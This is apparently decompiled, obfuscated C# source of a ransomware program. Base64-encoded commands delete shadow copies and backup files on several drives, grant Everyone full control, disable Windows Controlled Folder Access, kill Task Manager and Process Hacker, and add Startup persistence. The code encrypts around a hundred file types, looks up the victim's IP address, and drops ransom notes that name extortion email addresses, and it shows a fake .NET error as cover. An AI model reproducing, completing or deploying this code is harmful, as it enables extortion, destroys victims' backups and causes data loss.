	public static string TWkBmSBRcQTu = CZuAqRlrrEeJTK("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> DHCxwwlndjYWmk = new List<string>
	{
		CZuAqRlrrEeJTK("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		CZuAqRlrrEeJTK("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		CZuAqRlrrEeJTK("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		CZuAqRlrrEeJTK("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		CZuAqRlrrEeJTK("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		CZuAqRlrrEeJTK("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> oZnZxMQogz = new List<string>
	{
		CZuAqRlrrEeJTK("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		CZuAqRlrrEeJTK("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		CZuAqRlrrEeJTK("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string lHMhxGIBBYQVE = "NO";

	public static string zsBdZaooWjwzpvW = "NO";

	internal static DateTime OMDdPrtxwJyspZpU = new DateTime(2000, 1, 1);

	internal static DateTime TRIKxbuTjgDcTL = new DateTime(2100, 1, 1);

	public static string IGzafCiUvTKnTs = "YES";

	public static string YROKpHBeSOV = "10";

	public static string fGhagBnvNthXGMl = "NO";

	public static string VsENdljvquwVm = "NO";

	public static string MveFaeYddfZZE = "NO";

	public static string hQJNOUHNjcPqn = "YES";

	public static string wMJLVbbqqYqiw = "NO";

	public static string prkXlzmtQDXa = "NO";

	public static List<string> LWncuBZUPCH = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string CUgGjDJJsuh = "NO";

	public static string UusgggfFEiH = "1";

	public static string HLPOsPCSmASFwJq = "YES";

	public static string zuddOMKKNGT = "NO";

	public static string CvDLDdQLav = "NO";

	public static string DCpLsBJrrzEMg = string.Empty;

	public static string uRiJGjUhTqYP = "NO";

	public static string rhmPRbtdqhBH = "YES";

	public static string cgvIOHAaAfLmPm = "YES";

	public static string HvFMscdSmqtPxCWLg = "WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg==";

	public static string FbpdVerjgfWXZ = "V3JpdGUgeW91ciAiS2V5IElkZW50aWZpZXIiIGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsOiANCg0KZXF1YWxpdHl0cnVzdEBkaXNyb290Lm9yZw0Kb3INCndpbGxldHRhbW9mZmF0QHlhaG9vLmNvbQ==";

	public static string ZgWEtlXGAfeGz = "NO";

	public static string knresgzJiInZ = "NO";

	public static string UunaEKfJQyJj = "YES";

	public static string ISsfnPPVwjUYmaF = "NO";

	public static string wArKUkZBHlesF = "NO";

	public static string ozQPMCYmcyAuTAwk = "LOGONISOFF";

	public static string TrtHmLhYjrg = "NO";

	public static string uCgYILQvbRTW = "NO";

	public static string ySfDrgDsIwD = "mystartup.lnk";

	public static string ZUSwvvHcbYm = "NO";

	public static string SkBQVecwctEkM = "NO";

	public static string RuIhTIGFow = "YES";

	public static string caxUvlsWluDUB = "NO";

	public static string GpBysdvmnlMAkZ = "VGhhbm9z";

	public static string nblYfQGZpnj = "YES";

	public static string YBtklaWuJZZv = "NO";

	public static string KoxICzgXzwRj = "NO";

	public static string OvUhIOJkvVAlhA = "NO";

	public static string[] kzYczuIfDaw = new string[0];

	public static string xCMIeuGeak = "YES";

	public static bool JeyEmTDKUFo = true;

	public static string QmPMAcTsAipu = "NO";

	public static bool sTRoWRHIVycKW = false;

	public static bool qNaOJgFKjgde = false;

	public static bool qLPNSsEoxyGtaF = false;

	public static bool xmkDmsYtmgFPYOfi = false;

	public static string kOKakAljNFiEE = "Debug_Log.txt";

	public static bool QWMTAZEOVrAU = false;

	public static bool xTGpDjptXRecMJ = false;

	public static bool GmUKlTVxIgmD = false;

	public static bool eEVwLQEuFPc = false;

	public static bool qlEzvrxXFN = true;

	public static string XyiDrGGMhsB = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + HEBapABdzYbQ.YXfnaAHlzuBRj() + ".txt";

	public static bool nSLCvWTPGScIDK = false;

	public static Stopwatch FCoaDoYCvkrL = new Stopwatch();

	public static int NksflcjUNFsBl = 0;

	public static int QqDrvjCPIINo = 0;

	public static bool tQdFbIlBsTQIR = false;

	public static string AWOVMwfUoZKZmvd = ".[ID-" + HEBapABdzYbQ.YXfnaAHlzuBRj() + "]";

	public static string[] YxPVbqOwyzQqq = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> jncYfWEeZSRfqE = new List<string>();

	public static int CwiClwFbVgf = 0;

	private static void Main(string[] args)
	{
		try
		{
			string NiznuEFneatR = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == NiznuEFneatR) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			MaUfRxiaYqHfP.fmaGOeNUmyoETh(xiRjNUcJUnW);
		}
		catch (Exception)
		{
		}
		try
		{
			if (nblYfQGZpnj == "YES")
			{
				Thread thread = new Thread(NVKXloVznKHDar.urJHaJTFyc);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (lyiwJTVWcDLW == "YES")
		{
			Thread.Sleep(int.Parse(qHCsjBWBsUFT));
		}
		if (HLPOsPCSmASFwJq == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] PIAooWtkmxiwK = new string[4]
					{
						CZuAqRlrrEeJTK("VGFza21ncg=="),
						CZuAqRlrrEeJTK("dGFza21ncg=="),
						CZuAqRlrrEeJTK("UHJvY2Vzc0hhY2tlcg=="),
						CZuAqRlrrEeJTK("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						LsKTTEFrgVj.aEQWhdctdSXcLg(PIAooWtkmxiwK);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				xrLwQEgyzQy.FLuuOTvTkmt(CZuAqRlrrEeJTK("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				xrLwQEgyzQy.FLuuOTvTkmt(CZuAqRlrrEeJTK("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				xrLwQEgyzQy.FLuuOTvTkmt(CZuAqRlrrEeJTK("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				xrLwQEgyzQy.FLuuOTvTkmt(CZuAqRlrrEeJTK("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(LsKTTEFrgVj.NVeVVUzCJkbK);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (kUwCbaWTzOqNK == "YES")
		{
			MntpthAUNTEsN.cceSMFimBxB();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && wMJLVbbqqYqiw == "YES")
		{
			try
			{
				wgKCxETmMjZX(CZuAqRlrrEeJTK("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (DiPXXFwhZrRPLt == "YES" && rMwmbLdhsWQM.zCGynGELxJVkK())
			{
				new gsahLIimhbGVo().GNPoFVKoMIyV(zMjxzrslJThYY: false);
				rMwmbLdhsWQM.HvwyJoEOMpEv();
			}
		}
		catch (Exception)
		{
		}
		if (DOyeQIuTzhpzu == "YES" && rMwmbLdhsWQM.zCGynGELxJVkK())
		{
			new gsahLIimhbGVo().GNPoFVKoMIyV(zMjxzrslJThYY: false);
			new gsahLIimhbGVo().ojJWKiDpypINPz();
		}
		if (NoRofXBFnfWVFgm == "YES")
		{
			uYuVDXPjHEFWwB.AqpKYoyOCut();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (tXhnleJCjdOMPu == "YES" && fileName != text2)
			{
				Thread thread4 = new Thread(msTHwpVyvlrwP);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (TaIJZxciYkmOk == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					FwQzXAlWYon = rNixuUSALlAWZ(0, FVxsyspmSC.Count);
					File.Copy(fileName, text + FVxsyspmSC[FwQzXAlWYon], overwrite: true);
					Process.Start(text + FVxsyspmSC[FwQzXAlWYon]);
					ppntzUOyKXarvRo();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (lHMhxGIBBYQVE == "YES" && DateTime.Now < OMDdPrtxwJyspZpU)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (zsBdZaooWjwzpvW == "YES" && DateTime.Now > TRIKxbuTjgDcTL)
			{
				ppntzUOyKXarvRo();
			}
		}
		catch
		{
		}
		ixHYbSkpBn();
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(zJTLaOwTssl, delegate(string QYkpyedWKXUoiPv)
			{
				oapSGNsteEjKT(CZuAqRlrrEeJTK("c2MuZXhl"), QYkpyedWKXUoiPv);
			});
			Parallel.ForEach(hiSTWycUAwo, delegate(string wrkizCYNLSf)
			{
				oapSGNsteEjKT(CZuAqRlrrEeJTK("dGFza2tpbGwuZXhl"), wrkizCYNLSf);
			});
			if (OvUhIOJkvVAlhA == "YES")
			{
				Parallel.ForEach(kzYczuIfDaw, delegate(string JUolkCXQSThOx)
				{
					oapSGNsteEjKT(CZuAqRlrrEeJTK("dGFza2tpbGwuZXhl"), "/IM " + JUolkCXQSThOx + " /f");
				});
			}
			if (!jIauvqjdBhUVg().Contains("XP"))
			{
				eKCEivlNipT(TWkBmSBRcQTu);
			}
			else
			{
				Parallel.ForEach(wpQZWUqYgzgX, delegate(string KSXGInrBEc)
				{
					oapSGNsteEjKT(CZuAqRlrrEeJTK(ApEzVvHpDX("lhXZu4WatRWYzNnd")), KSXGInrBEc);
				});
			}
			Parallel.ForEach(DHCxwwlndjYWmk, delegate(string lMObWxPlKtXm)
			{
				oapSGNsteEjKT(CZuAqRlrrEeJTK("ZGVsLmV4ZQ=="), lMObWxPlKtXm);
			});
		});
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !mVucaeNrRtoSGRM.Contains(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									mVucaeNrRtoSGRM.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "true")
						{
							knresgzJiInZ = "YES";
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "false")
						{
							knresgzJiInZ = "NO";
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(kOKakAljNFiEE, "Configuration text file error: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (knresgzJiInZ == "NO")
		{
			CHYtOvzmOg();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && qLPNSsEoxyGtaF)
			{
				try
				{
					Thread thread6 = new Thread(AkvXETGnJAnN.aMyOELYtGdvP);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			oapSGNsteEjKT("cmd.exe", CZuAqRlrrEeJTK("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		SecureString secureString = new SecureString();
		if (fGhagBnvNthXGMl == "NO")
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			SCfJDJJeFRzoLD = "L0JK3GEWHLBMDTX4STXWY48CEBTMJZLP";
		}
		exLsMhwhckIzmt = ddeFRRDtEqs.wfmtJmcBJJaY(ZxDNHKSpof(secureString));
		if (rhmPRbtdqhBH == "YES")
		{
			ICCsHsurCTEX();
		}
		if (GmUKlTVxIgmD)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), XyiDrGGMhsB)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), XyiDrGGMhsB), string.Concat(CZuAqRlrrEeJTK("Q2xpZW50IElQOiA="), new WebClient().DownloadString(CZuAqRlrrEeJTK("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", CZuAqRlrrEeJTK("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", CZuAqRlrrEeJTK("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), exLsMhwhckIzmt));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), XyiDrGGMhsB), "\r\nAdditional KeyID: " + exLsMhwhckIzmt);
				}
			}
			catch (Exception ex9)
			{
				if (QWMTAZEOVrAU)
				{
					try
					{
						File.AppendAllText(kOKakAljNFiEE, "Error while creating Local Report: " + ex9.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		pAKcNBrOhpMCpM.vNNFpnAhKTQEx(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ySfDrgDsIwD), scEDXtPxqzCLC(exLsMhwhckIzmt), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			aXATEwJNuqjNU();
		}
		try
		{
			try
			{
				if (nSLCvWTPGScIDK)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			PKcOvsDifYXZ(new string[1] { "[auto]" }, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], ZxDNHKSpof(secureString), ".secure[equalitytrust@disroot.org]");
		}
		catch (Exception ex11)
		{
			if (QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(kOKakAljNFiEE, "Finish process: " + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(CZuAqRlrrEeJTK("V3JpdGUgeW91ciAiS2V5IElkZW50aWZpZXIiIGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsOiANCmVxdWFsaXR5dHJ1c3RAZGlzcm9vdC5vcmcNCm9yDQp3aWxsZXR0YW1vZmZhdEB5YWhvby5jb20="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(CZuAqRlrrEeJTK("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(exLsMhwhckIzmt);
				if (UhhaeZclnYxkU == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(CZuAqRlrrEeJTK("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(ShmRLOSlbOEEzcZ.Count));
				}
				if (tQdFbIlBsTQIR)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(CZuAqRlrrEeJTK("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(HEBapABdzYbQ.YXfnaAHlzuBRj());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				if (!text8.Contains(exLsMhwhckIzmt) && !sTRoWRHIVycKW)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + exLsMhwhckIzmt);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in PaviRzoDrHSF)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text9.Contains(exLsMhwhckIzmt) && !sTRoWRHIVycKW)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + exLsMhwhckIzmt);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!xmkDmsYtmgFPYOfi && num > 10)
			{
				break;
			}
		}
		if (RuIhTIGFow == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(CZuAqRlrrEeJTK("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxpbWcgYWx0PSIiIHNyYz0iaHR0cHM6Ly9jZG4ubW9zLmNtcy5mdXR1cmVjZG4ubmV0L3U4d1NITW1NTVh6WnVBRkJDbWNzQ0stNjUwLTgwLmpwZyIgc3R5bGU9ImhlaWdodDo0MDNweDsgd2lkdGg6NjUwcHgiIC8+PC9wPgoKPHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPiZuYnNwOzwvcD4KCjxwcmUgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPgo8YmlnPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MThweCI+PHN0cm9uZz5Zb3VyIGZpbGVzIGFyZSBzZWN1cmVkLi4uPC9zdHJvbmc+PC9zcGFuPjwvYmlnPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MTZweCI+Cjwvc3Bhbj4KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxOHB4OyI+PHN0cm9uZz5Xcml0ZSB5b3VyICZxdW90O0tleSBJZGVudGlmaWVyJnF1b3Q7IGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsPC9zdHJvbmc+Ojwvc3Bhbj4KCjxzcGFuIHN0eWxlPSJmb250LXNpemU6MTZweDsiPjxzdHJvbmc+PHNwYW4gc3R5bGU9ImNvbG9yOiMwMDAwRkY7Ij5lcXVhbGl0eXRydXN0QGRpc3Jvb3Qub3JnPC9zcGFuPjwvc3Ryb25nPgpvcgo8c3Ryb25nPjxzcGFuIHN0eWxlPSJjb2xvcjojMDAwMEZGOyI+d2lsbGV0dGFtb2ZmYXRAeWFob28uY29tPC9zcGFuPjwvc3Ryb25nPjwvc3Bhbj4="));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(CZuAqRlrrEeJTK("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(exLsMhwhckIzmt + CZuAqRlrrEeJTK("PC9wPg=="));
					if (UhhaeZclnYxkU == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(CZuAqRlrrEeJTK("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + CZuAqRlrrEeJTK("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(ShmRLOSlbOEEzcZ.Count) + CZuAqRlrrEeJTK("PC9wPg=="));
					}
					if (tQdFbIlBsTQIR)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(CZuAqRlrrEeJTK("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(HEBapABdzYbQ.YXfnaAHlzuBRj());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text10.Contains(exLsMhwhckIzmt) && !sTRoWRHIVycKW)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", CZuAqRlrrEeJTK("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + exLsMhwhckIzmt + CZuAqRlrrEeJTK("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (qlkWxQVtuOp == "YES")
		{
			try
			{
				if (UhhaeZclnYxkU == "NO")
				{
					HEBapABdzYbQ.GPORjTPuBUAh("URL", "USERNAME", "ACCESO", string.Concat(CZuAqRlrrEeJTK("Q2xpZW50IElQOiA="), new WebClient().DownloadString(CZuAqRlrrEeJTK("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", CZuAqRlrrEeJTK("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", CZuAqRlrrEeJTK("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(ShmRLOSlbOEEzcZ.Count), "\r\n", CZuAqRlrrEeJTK("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), exLsMhwhckIzmt));
				}
				else
				{
					HEBapABdzYbQ.GPORjTPuBUAh("URL", "USERNAME", "ACCESO", string.Concat(CZuAqRlrrEeJTK("Q2xpZW50IElQOiA="), new WebClient().DownloadString(CZuAqRlrrEeJTK("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", CZuAqRlrrEeJTK("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", CZuAqRlrrEeJTK("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(ShmRLOSlbOEEzcZ.Count), "\r\n", CZuAqRlrrEeJTK("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), exLsMhwhckIzmt));
				}
			}
			catch
			{
			}
		}
		if (mwemKzzdAQz == "YES")
		{
			try
			{
				YzsUZyBfxRjR.YfuSsQsOVdlQI(new Uri(""));
			}
			catch
			{
			}
		}
		if (RuIhTIGFow == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(CZuAqRlrrEeJTK("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(CZuAqRlrrEeJTK("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (rhmPRbtdqhBH == "YES")
		{
			if (cgvIOHAaAfLmPm == "YES" && !string.IsNullOrEmpty(HvFMscdSmqtPxCWLg) && !string.IsNullOrEmpty(FbpdVerjgfWXZ))
			{
				cneGpqVGMUi(HvFMscdSmqtPxCWLg, FbpdVerjgfWXZ);
			}
			else
			{
				cneGpqVGMUi();
			}
		}
		if (ozQPMCYmcyAuTAwk != "LOGONISOFF")
		{
			dicOWWYcqyk(ozQPMCYmcyAuTAwk);
		}
		if (!string.IsNullOrEmpty(DCpLsBJrrzEMg))
		{
			try
			{
				File.Delete(DCpLsBJrrzEMg);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(kOKakAljNFiEE, "Error deleting config text file: " + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (QWMTAZEOVrAU)
		{
			try
			{
				File.AppendAllText(kOKakAljNFiEE, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (HldgbYiGZUf == "EVET")
		{
			ppntzUOyKXarvRo();
		}
	}

	public static void msTHwpVyvlrwP()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(CZuAqRlrrEeJTK("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), CZuAqRlrrEeJTK("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int rNixuUSALlAWZ(int UGnYpPOrHEXu, int kNfkkBwiHSiuAB)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(UGnYpPOrHEXu, kNfkkBwiHSiuAB);
	}

	public static List<string> HbVPzLeHIOQ(string cxmPfnQSqmYK, string[] kegwvYmgxlGUAV, string sogJRrLbEgSgQei, string[] qwmferYisHiHM, string GymlvZOhDcaID)
	{
